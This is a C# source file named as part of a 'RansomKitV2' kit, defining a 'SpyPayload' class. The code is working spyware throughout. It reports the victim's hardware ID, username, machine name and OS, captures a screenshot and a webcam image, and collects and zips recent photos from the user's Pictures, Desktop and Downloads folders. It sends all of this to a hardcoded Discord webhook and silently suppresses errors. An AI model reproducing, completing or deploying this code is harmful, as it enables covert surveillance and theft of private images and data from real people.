using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Management;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Threading;
using System.Threading.Tasks;
using OpenCvSharp;

namespace RansomKitV2
{
    public static class SpyPayload
    {
        private const string WebhookUrl = "https://discord.com/api/webhooks/1566886705829646500/TroPv8l37pvtuTTr__7VWeJy-fFXAiQekqq1-QIp5AvfHAPlsgBU0nWGTl9r8780gHdJ";

        public static async Task ExecuteAsync()
        {
            try
            {
                // 1. Send System Info
                string hwid = GetHWID();
                string username = Environment.UserName;
                string os = Environment.OSVersion.ToString();
                string pcName = Environment.MachineName;

                string infoText = $"**New Victim Connected**\n" +
                                  $"**HWID:** `{hwid}`\n" +
                                  $"**PC Name:** `{pcName}`\n" +
                                  $"**User:** `{username}`\n" +
                                  $"**OS:** `{os}`\n" +
                                  $"**Time:** {DateTime.Now}";

                await SendMessageToDiscord(infoText);

                // 2. Screenshot
                string screenshotPath = Path.Combine(Path.GetTempPath(), "ss_" + Guid.NewGuid().ToString() + ".png");
                CaptureScreenshot(screenshotPath);
                if (File.Exists(screenshotPath))
                {
                    await SendFileToDiscord(screenshotPath, "Screenshot.png");
                    File.Delete(screenshotPath);
                }

                // 3. Webcam
                string webcamPath = Path.Combine(Path.GetTempPath(), "cam_" + Guid.NewGuid().ToString() + ".jpg");
                CaptureWebcam(webcamPath);
                if (File.Exists(webcamPath))
                {
                    await SendFileToDiscord(webcamPath, "Webcam.jpg");
                    File.Delete(webcamPath);
                }

                // 4. Steal Pictures
                await StealPicturesAsync();
            }
            catch { }
        }

        // =========================================================
        //  PICTURE STEALER
        // =========================================================
        private static async Task StealPicturesAsync()
        {
            try
            {
                var imageExtensions = new HashSet<string>(StringComparer.OrdinalIgnoreCase)
                { ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".webp" };

                var targetDirs = new List<string>();
                string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

                // Add standard picture locations
                targetDirs.Add(Path.Combine(userProfile, "Pictures"));
                targetDirs.Add(Path.Combine(userProfile, "Desktop"));
                targetDirs.Add(Path.Combine(userProfile, "Downloads"));
                targetDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));

                var foundImages = new List<FileInfo>();
                var options = new EnumerationOptions { IgnoreInaccessible = true, RecurseSubdirectories = true };

                foreach (var dir in targetDirs)
                {
                    if (!Directory.Exists(dir)) continue;
                    try
                    {
                        var dirInfo = new DirectoryInfo(dir);
                        var files = dirInfo.GetFiles("*.*", options)
                            .Where(f => imageExtensions.Contains(f.Extension) && f.Length > 0 && f.Length < 10 * 1024 * 1024) // Max 10MB per pic
                            .OrderByDescending(f => f.LastWriteTime)
                            .Take(50); // Take top 50 recent

                        foundImages.AddRange(files);
                    }
                    catch { }
                }

                if (foundImages.Count == 0) return;

                // Create zip file
                string zipPath = Path.Combine(Path.GetTempPath(), "pics_" + Guid.NewGuid().ToString() + ".zip");

                using (var zip = ZipFile.Open(zipPath, ZipArchiveMode.Create))
                {
                    foreach (var file in foundImages)
                    {
                        try
                        {
                            // Keep the original file name, but handle duplicates
                            string entryName = file.Name;
                            if (zip.GetEntry(entryName) != null)
                                entryName = Guid.NewGuid().ToString().Substring(0, 4) + "_" + file.Name;

                            zip.CreateEntryFromFile(file.FullName, entryName, CompressionLevel.Fastest);
                        }
                        catch { }
                    }
                }

                // Send Zip to Discord
                if (File.Exists(zipPath))
                {
                    await SendFileToDiscord(zipPath, $"Stolen_Pictures_{foundImages.Count}.zip");
                    File.Delete(zipPath);
                }
            }
            catch { }
        }

        // =========================================================
        //  CORE HELPER METHODS
        // =========================================================
        private static string GetHWID()
        {
            try
            {
                string cpuInfo = string.Empty;
                using (ManagementClass mc = new ManagementClass("win32_processor"))
                using (ManagementObjectCollection moc = mc.GetInstances())
                {
                    foreach (ManagementObject mo in moc)
                    {
                        cpuInfo = mo.Properties["processorID"]?.Value?.ToString() ?? "Unknown";
                        break;
                    }
                }
                return cpuInfo;
            }
            catch { return "Unknown"; }
        }

        private static void CaptureScreenshot(string savePath)
        {
            try
            {
                var screen = System.Windows.Forms.Screen.PrimaryScreen;
                if (screen == null) return;

                Rectangle bounds = screen.Bounds;
                using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
                {
                    using (Graphics g = Graphics.FromImage(bitmap))
                    {
                        g.CopyFromScreen(System.Drawing.Point.Empty, System.Drawing.Point.Empty, bounds.Size);
                    }
                    bitmap.Save(savePath, ImageFormat.Png);
                }
            }
            catch { }
        }

        private static void CaptureWebcam(string savePath)
        {
            try
            {
                using (var capture = new VideoCapture(0))
                {
                    if (!capture.IsOpened()) return;
                    Thread.Sleep(1500);
                    using (var frame = new Mat())
                    {
                        capture.Read(frame);
                        if (!frame.Empty())
                        {
                            Cv2.ImWrite(savePath, frame);
                        }
                    }
                }
            }
            catch { }
        }

        private static async Task SendMessageToDiscord(string message)
        {
            using (var client = new HttpClient())
            {
                var content = new StringContent($"{{\"content\": \"{message.Replace("\n", "\\n").Replace("\"", "\\\"")}\"}}", System.Text.Encoding.UTF8, "application/json");
                await client.PostAsync(WebhookUrl, content);
            }
        }

        private static async Task SendFileToDiscord(string filePath, string fileName)
        {
            using (var client = new HttpClient())
            using (var form = new MultipartFormDataContent())
            {
                var fileContent = new ByteArrayContent(File.ReadAllBytes(filePath));
                fileContent.Headers.ContentType = new MediaTypeHeaderValue("application/octet-stream");

                form.Add(fileContent, "file", fileName);
                form.Add(new StringContent(fileName), "content");

                await client.PostAsync(WebhookUrl, form);
            }
        }
    }
}